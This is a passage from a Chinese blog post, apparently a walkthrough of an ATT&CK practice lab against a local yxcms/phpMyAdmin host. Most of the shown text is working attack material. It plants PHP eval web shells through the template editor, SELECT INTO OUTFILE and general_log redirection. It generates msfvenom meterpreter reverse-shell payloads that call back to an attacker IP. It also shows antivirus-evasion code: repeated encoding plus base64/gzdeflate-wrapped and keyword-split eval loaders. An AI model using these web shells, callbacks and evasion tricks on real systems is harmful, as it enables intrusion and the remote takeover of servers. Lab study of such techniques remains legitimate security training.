+<h3 id=314-yxcms后台任意文件读写漏洞>3.1.4 yxcms后台任意文件读写漏洞<a hidden class=anchor aria-hidden=true href=#314-yxcms后台任意文件读写漏洞>#</a></h3>
+<p>进入后台管理页面→管理首页→前台模板→管理模板文件→新建，写入一句话木马：</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/img/image-20210721172858019.png alt=image-20210721172858019>
+</p>
+<p>创建之后，根据之前的目录索引或网站源码查找文件存储路径：<code>http://192.168.106.150/yxcms/protected/apps/default/view/default/</code>，使用蚁剑连接小马：</p>
+<pre tabindex=0><code>Shell url	:	http://192.168.106.150/yxcms/protected/apps/default/view/default/oopsdc.php
+Shell pwd	:	cmd
+</code></pre><p>成功连接。</p>
+<h3 id=315-yxcms后台sql注入漏洞>3.1.5 yxcms后台SQL注入漏洞<a hidden class=anchor aria-hidden=true href=#315-yxcms后台sql注入漏洞>#</a></h3>
+<p>进入后台管理页面→结构管理→碎片列表→删除，在点击删除之前使用<code>bp</code>抓包，正常删除已存在的碎片会有回显结果，删除不存在的碎片则无回显，判断存在<code>SQL</code>盲注。对于无回显的情况，可通过使用<code>CEYE</code><a href=https://www.cnblogs.com/zhaijiahui/p/9160913.html#autoid-4-2-11>CEYE平台的使用 - 时光不改 - 博客园 (cnblogs.com)</a>及类似工具查看回显。</p>
+<h3 id=316-sql语句文件写入>3.1.6 SQL语句文件写入<a hidden class=anchor aria-hidden=true href=#316-sql语句文件写入>#</a></h3>
+<p>在<code>phpmyadmin</code>页面通过<code>SQL</code>查询语句<code>outfile</code>写入一句话木马：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=color:#66d9ef>select</span> <span style=color:#e6db74>&#39;&lt;?php eval($_POST[123]);?&gt;&#39;</span> <span style=color:#66d9ef>into</span> outfile <span style=color:#e6db74>&#39;C:/phpStudy/WWW/1.php&#39;</span>
+</code></pre></div><p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/img/image-20210721183424671.png alt=image-20210721183424671>
+</p>
+<p>查看<code>secure-file-priv</code>变量配置：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=color:#66d9ef>show</span> <span style=color:#66d9ef>global</span> <span style=color:#66d9ef>variable</span> <span style=color:#66d9ef>like</span> <span style=color:#e6db74>&#39;%secure%&#39;</span>;
+</code></pre></div><p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/img/image-20210721183911691.png alt=image-20210721183911691>
+</p>
+<p>变量值为<code>NULL</code>不可读写，且变量只读不可编辑。</p>
+<h3 id=317-开启全局日志getshell>3.1.7 开启全局日志getshell<a hidden class=anchor aria-hidden=true href=#317-开启全局日志getshell>#</a></h3>
+<p>使用以下语句查询全局日志变量配置：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=color:#66d9ef>show</span> variables <span style=color:#66d9ef>like</span> <span style=color:#e6db74>&#39;%general%&#39;</span>;
+</code></pre></div><p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/img/image-20210721191503066.png alt=image-20210721191503066>
+</p>
+<p>开启<code>general_log</code>将所有查询语句记录到新指定的可访问文件中：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=color:#66d9ef>set</span> <span style=color:#66d9ef>global</span> general_log <span style=color:#f92672>=</span> <span style=color:#66d9ef>on</span>;
+</code></pre></div><p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/img/image-20210721191838903.png alt=image-20210721191838903>
+</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=color:#66d9ef>set</span> <span style=color:#66d9ef>global</span> general_log_file <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;C:/phpStudy/www/2.php&#39;</span>;
+</code></pre></div><p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/img/image-20210721193656851.png alt=image-20210721193656851>
+</p>
+<p>写入一句话木马：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=color:#66d9ef>select</span> <span style=color:#e6db74>&#39;&lt;?php eval($_POST[123]);?&gt;&#39;</span>
+</code></pre></div><p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/img/image-20210721192230776.png alt=image-20210721192230776>
+</p>
+<p>蚁剑连接即可。</p>
+<h2 id=32-后台getshell技巧>3.2 后台getshell技巧<a hidden class=anchor aria-hidden=true href=#32-后台getshell技巧>#</a></h2>
+<h3 id=321-上传大马>3.2.1 上传大马<a hidden class=anchor aria-hidden=true href=#321-上传大马>#</a></h3>
+<p>上传大马获得命令执行环境。</p>
+<h3 id=322-msf监听反弹shell>3.2.2 msf监听反弹shell<a hidden class=anchor aria-hidden=true href=#322-msf监听反弹shell>#</a></h3>
+<p>进入<code>msf</code>：</p>
+<pre tabindex=0><code>msfconsole
+</code></pre><p>使用<code>msfvenom</code>生成<code>payload</code>文件，使用蚁剑上传至<code>WWW</code>目录：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>msfvenom -p php/meterpreter/reverse_tcp LHOST<span style=color:#f92672>=</span>192.168.106.138 -f raw &gt; test.php
+
+<span style=color:#75715e># 参数解释</span>
+p		:		添加载荷<span style=color:#f92672>(</span>payload<span style=color:#f92672>)</span>
+f		:		输出文件格式，文件会在当前目录生成
+</code></pre></div><p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/img/image-20210721195859418.png alt=image-20210721195859418>
+</p>
+<p>接下来使用<code>handler</code>模块接收反弹模块，在<code>8888</code>端口进行监听，访问<code>test.php</code>，连接成功：</p>
+<pre tabindex=0><code>use exploit/multi/handler
+run
+</code></pre><p>还可利用应用系统漏洞，如永恒之蓝等。</p>
+<h3 id=323-免杀payload>3.2.3 免杀payload<a hidden class=anchor aria-hidden=true href=#323-免杀payload>#</a></h3>
+<p>在目标主机存在杀软的情况下，上传<code>payload</code>后会被检测并清除，因此需要对<code>payload</code>进行免杀操作。使用<code>msfvenom</code>生成<code>payload</code>，此处采用<code>shellcode</code>方式借助第三方直接加载到内存中，如：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i <span style=color:#ae81ff>12</span> -b <span style=color:#e6db74>&#39;\x00&#39;</span> LHOST<span style=color:#f92672>=</span>&lt;ip&gt; LPORT<span style=color:#f92672>=</span>&lt;port&gt; -f c
+
+<span style=color:#75715e># 参数解释</span>
+e		:		选择指定编码器
+i		:		编码次数
+b		:		去除多余/坏掉字符
+f		:		输出文件格式，此处使用C编译器编写代码
+</code></pre></div><p>相关文章：</p>
+<p><a href=https://www.cnblogs.com/LyShark/p/11331476.html>Payload 实现分离免杀 - lyshark - 博客园 (cnblogs.com)</a></p>
+<p>还可通过多层编码对大马原文件进行编码，对关键字进行拆解免杀，脚本：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php>$src <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_get_contents</span>(<span style=color:#e6db74>&#39;C:\phpStudy\WWW\dama.txt&#39;</span>);	<span style=color:#75715e># 大马源码路径
+</span><span style=color:#75715e></span>$enc <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_encode</span>(<span style=color:#a6e22e>gzdeflate</span>($code));	<span style=color:#75715e># 加密函数，可自行修改
+</span><span style=color:#75715e></span><span style=color:#66d9ef>echo</span> $enc	<span style=color:#75715e># 输出编码后的代码
+</span></code></pre></div><p>使用编码后的代码：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+<span style=color:#66d9ef>eval</span>(<span style=color:#a6e22e>gzdeflate</span>(<span style=color:#a6e22e>base64_decode</span>(<span style=color:#e6db74>&#39;&lt;encoded-string&gt;&#39;</span>)));
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>关键字免杀：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+$o <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;BasE6&#39;</span>;
+$p <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;4_&#39;</span>;
+$s <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;dE&#39;</span>;
+$d <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;Co&#39;</span>;
+$c <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;De&#39;</span>;
+$opsdc <span style=color:#f92672>=</span> $o<span style=color:#f92672>.</span>$p<span style=color:#f92672>.</span>$s<span style=color:#960050;background-color:#1e0010>$</span><span style=color:#f92672>.</span><span style=color:#a6e22e>d</span><span style=color:#f92672>.</span>$c;
+$a <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;opsdc&#34;</span>;
+$res <span style=color:#f92672>=</span> $$a(<span style=color:#e6db74>&#39;源码Base64编码&#39;</span>)
+<span style=color:#66d9ef>eval</span>($res);
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010>&lt;?
+</span><span style=color:#960050;background-color:#1e0010>$res = strrev(&#39;EdoCeD_46EsAb&#39;);
+</span><span style=color:#960050;background-color:#1e0010>$b = $res(&#39;源码Base64编码&#39;);
+</span><span style=color:#960050;background-color:#1e0010>eval($b);
+</span><span style=color:#960050;background-color:#1e0010>?&gt;
+</span></code></pre></div><blockquote>
+<p>本文链接：<a href=https://oopsdc.tk/post/attck%E5%AE%9E%E6%88%98%E4%B8%80/>ATT&CK实战一 | Atmet (oopsdc.tk)</a></p>
+<p>文章许可：本文采用<a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh>CC BY-NC-SA 4.0</a>许可协议，转载请注明出处。</p>
+</blockquote>
+</div>
+<footer class=post-footer>
+<ul class=post-tags>
+<li><a href=https://examplesite.com/tags/daily/>Daily</a></li>
+</ul>
+<nav class=paginav>
+<a class=prev href=https://examplesite.com/post/buuctf/>
+<span class=title>« Prev Page</span>
+<br>
+<span>BUUCTF</span>
+</a>
+<a class=next href=https://examplesite.com/post/%E6%B5%85%E6%9E%90apns%E6%8E%A8%E9%80%81%E6%9C%BA%E5%88%B6/>
+<span class=title>Next Page »</span>
+<br>
+<span>浅析APNs推送机制</span>
+</a>
+</nav>
+<div class=share-buttons>
+<a target=_blank rel="noopener noreferrer" aria-label="share ATT&CK实战一 on twitter" href="https://twitter.com/intent/tweet/?text=ATT%26CK%e5%ae%9e%e6%88%98%e4%b8%80&url=https%3a%2f%2fexamplesite.com%2fpost%2fattck%25E5%25AE%259E%25E6%2588%2598%25E4%25B8%2580%2f&hashtags=Daily"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share ATT&CK实战一 on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fexamplesite.com%2fpost%2fattck%25E5%25AE%259E%25E6%2588%2598%25E4%25B8%2580%2f&title=ATT%26CK%e5%ae%9e%e6%88%98%e4%b8%80&summary=ATT%26CK%e5%ae%9e%e6%88%98%e4%b8%80&source=https%3a%2f%2fexamplesite.com%2fpost%2fattck%25E5%25AE%259E%25E6%2588%2598%25E4%25B8%2580%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share ATT&CK实战一 on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fexamplesite.com%2fpost%2fattck%25E5%25AE%259E%25E6%2588%2598%25E4%25B8%2580%2f&title=ATT%26CK%e5%ae%9e%e6%88%98%e4%b8%80"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share ATT&CK实战一 on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fexamplesite.com%2fpost%2fattck%25E5%25AE%259E%25E6%2588%2598%25E4%25B8%2580%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share ATT&CK实战一 on whatsapp" href="https://api.whatsapp.com/send?text=ATT%26CK%e5%ae%9e%e6%88%98%e4%b8%80%20-%20https%3a%2f%2fexamplesite.com%2fpost%2fattck%25E5%25AE%259E%25E6%2588%2598%25E4%25B8%2580%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share ATT&CK实战一 on telegram" href="https://telegram.me/share/url?text=ATT%26CK%e5%ae%9e%e6%88%98%e4%b8%80&url=https%3a%2f%2fexamplesite.com%2fpost%2fattck%25E5%25AE%259E%25E6%2588%2598%25E4%25B8%2580%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
+</a>
+</div>
+</footer>
+</article>
+</main>
+<footer class=footer>
+<span>&copy; 2021 <a href=https://examplesite.com/>0opsdc</a></span>
+<span>
+Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
+</span>
+</footer>
+<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a>
+<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
+<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
+<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
+<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
+</body>
+</html>
